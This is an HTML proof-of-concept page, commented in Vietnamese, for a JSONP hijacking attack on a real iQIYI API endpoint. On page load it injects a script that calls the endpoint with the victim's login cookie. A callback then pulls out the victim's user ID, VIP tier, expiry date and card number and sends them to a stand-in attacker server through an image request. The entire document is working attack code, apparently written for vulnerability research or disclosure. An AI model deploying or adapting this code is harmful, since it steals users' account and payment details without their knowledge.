<!DOCTYPE html>
<html>
<head>
    <title>JSONP Hijacking POC</title>
    <meta charset="utf-8">
</head>
<body>
    <script>
        // 1. Hàm Callback nhận dữ liệu nhạy cảm từ iQIYI
        window.myCallback = function(data) {
            if (data && data.data && data.data.all_vip) {
                const vipInfo = data.data.all_vip[0];
                
                // Lấy ra các thông tin nhạy cảm
                const leakedData = {
                    uid: vipInfo.uid,
                    vipType: vipInfo.vipTypeDesc,
                    expireDate: vipInfo.deadline,
                    cardNumber: vipInfo.cardNumber
                };

                console.log("Mã độc đã đọc được:", leakedData);

                // 2. Gửi dữ liệu thu thập được về máy chủ của kẻ tấn công (giả lập)
                // Kẻ tấn công sẽ nhận được dữ liệu này thông qua tham số query trên URL của họ
                const attackerServer = "https://attacker-server.com/log_stolen_data";
                
                const img = new Image();
                img.src = `${attackerServer}?data=${encodeURIComponent(JSON.stringify(leakedData))}`;
            }
        };

        // 3. Tự động tạo thẻ script và chèn vào trang để kích hoạt request
        // Trình duyệt của nạn nhân sẽ tự động đính kèm Cookie đăng nhập của iQIYI vào request này
        const script = document.createElement("script");
        script.src = "https://pcw-api.iq.com/api/vtype?batch=1&deviceId=60960e118c37f898dac4cabfa5e0310f&modeCode=vn&langCode=en_us&platformId=3&vipInfoVersion=5.0&callback=myCallback";
        document.body.appendChild(script);
    </script>
</body>
</html>
